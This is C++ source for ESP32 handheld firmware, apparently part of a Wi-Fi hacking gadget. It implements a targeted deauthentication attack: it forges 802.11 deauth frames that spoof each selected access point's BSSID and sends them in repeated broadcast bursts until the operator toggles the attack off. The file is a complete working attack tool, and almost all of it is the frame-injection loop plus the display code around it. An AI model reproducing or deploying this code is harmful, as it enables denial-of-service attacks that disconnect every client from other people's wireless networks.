/*
 * Targeted Deauth — see header.
 */

#include "deauth_attack.h"
#include "target_list.h"
#include "wificonfig.h"
#include "utils.h"
#include "Touchscreen.h"

#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <string.h>

#define DARK_GRAY 0x4208

#define BTN_UP     6
#define BTN_DOWN   3
#define BTN_LEFT   4
#define BTN_RIGHT  5

namespace DeauthAttack {

// 802.11 Deauthentication frame. Header layout:
//   [0..1]   Frame Control: 0xc0 0x00 = type=Mgmt, subtype=Deauth
//   [2..3]   Duration
//   [4..9]   Destination (broadcast or specific client)
//   [10..15] Source (AP BSSID — we spoof this)
//   [16..21] BSSID (= Source)
//   [22..23] Sequence number
//   [24..25] Reason code (0x0002 = previous auth no longer valid)
static uint8_t deauth_frame[26] = {
  0xc0, 0x00, 0x3a, 0x01,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // dest = broadcast
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // src/BSSID — filled per-AP
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xf0, 0xff, 0x02, 0x00
};

static bool      attackActive = false;
static uint32_t  totalFrames  = 0;
static uint8_t   currentChannel = 1;
static uint32_t  lastUiUpdate = 0;
static uint32_t  lastBtnMs = 0;
static const uint32_t BTN_DEBOUNCE_MS = 200;

static void sendDeauth(const uint8_t bssid[6], uint8_t channel) {
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  delay(1);
  // dest stays broadcast (frame[4..9] already 0xff)
  for (int i = 0; i < 6; i++) {
    deauth_frame[10 + i] = bssid[i];
    deauth_frame[16 + i] = bssid[i];
  }
  // Burst 3 frames per AP per pass for reliability
  for (int b = 0; b < 3; b++) {
    esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
    totalFrames++;
  }
}

static void drawTopStatus() {
  tft.fillRect(35, 20, 205, 16, DARK_GRAY);
  tft.setTextFont(1);
  tft.setTextSize(1);
  tft.setTextColor(attackActive ? TFT_RED : TFT_WHITE);
  tft.setCursor(35, 24);
  tft.printf("DEAUTH  %d sel  %u TX",
             TargetList::selectedCount(), (unsigned)totalFrames);
  tft.setTextColor(attackActive ? TFT_GREEN : TFT_DARKGREY);
  tft.setCursor(170, 24);
  tft.print(attackActive ? "ACTIVE" : "PAUSED");
}

static void drawInfoBlock() {
  tft.fillRect(0, 45, tft.width(), tft.height() - 60, TFT_BLACK);
  tft.setTextFont(1);
  tft.setTextSize(1);
  tft.setTextColor(TFT_YELLOW);
  tft.setCursor(2, 50);
  tft.print("Targeted Deauth Attack");
  tft.setTextColor(TFT_WHITE);
  tft.setCursor(2, 75);
  tft.print("[UP]     Toggle ON/OFF");
  tft.setCursor(2, 90);
  tft.print("[SELECT] Exit");
  tft.setCursor(2, 115);
  tft.setTextColor(TFT_CYAN);
  tft.print("Selected APs:");
  tft.setTextColor(TFT_WHITE);
  int row = 0;
  for (int i = 0; i < TargetList::targetCount && row < 9; i++) {
    if (!TargetList::targets[i].selected) continue;
    tft.setCursor(2, 135 + row * 14);
    char ssid_show[18];
    int sl = strlen(TargetList::targets[i].ssid);
    if (sl > 17) sl = 17;
    memcpy(ssid_show, TargetList::targets[i].ssid, sl);
    ssid_show[sl] = '\0';
    tft.printf("%-17s c%-2d %d", ssid_show,
               (int)TargetList::targets[i].channel,
               (int)TargetList::targets[i].rssi);
    row++;
  }
  if (TargetList::selectedCount() == 0) {
    tft.setTextColor(TFT_RED);
    tft.setCursor(2, 135);
    tft.print("No targets selected.");
    tft.setTextColor(TFT_WHITE);
    tft.setCursor(2, 155);
    tft.print("Run AP Scan & Select first.");
  }
}

void deauthAttackSetup() {
  tft.fillScreen(TFT_BLACK);
  setupTouchscreen();

  attackActive = false;
  totalFrames = 0;
  currentChannel = 1;

  pcf.pinMode(BTN_UP, INPUT_PULLUP);
  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);

  // WiFi up in AP mode for raw mgmt TX. Idempotent — already-init is fine.
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_mode(WIFI_MODE_AP);
  esp_wifi_start();

  Serial.println("[Deauth] ready, awaiting toggle");

  float v = readBatteryVoltage();
  drawStatusBar(v, false);
  tft.fillRect(0, 20, 240, 16, DARK_GRAY);
  drawInfoBlock();
  drawTopStatus();
  lastUiUpdate = millis();
}

void deauthAttackLoop() {
  tft.drawLine(0, 19, 240, 19, TFT_WHITE);

  uint32_t now = millis();
  if (now - lastBtnMs > BTN_DEBOUNCE_MS) {
    if (!pcf.digitalRead(BTN_UP)) {
      attackActive = !attackActive;
      Serial.printf("[Deauth] %s\n", attackActive ? "STARTED" : "PAUSED");
      lastBtnMs = now;
      drawTopStatus();
    }
  }

  if (attackActive) {
    for (int i = 0; i < TargetList::targetCount; i++) {
      if (!TargetList::targets[i].selected) continue;
      sendDeauth(TargetList::targets[i].bssid, TargetList::targets[i].channel);
      currentChannel = TargetList::targets[i].channel;
    }
  }

  if (now - lastUiUpdate > 300) {
    drawTopStatus();
    lastUiUpdate = now;
  }

  delay(attackActive ? 5 : 30);
}

}  // namespace DeauthAttack
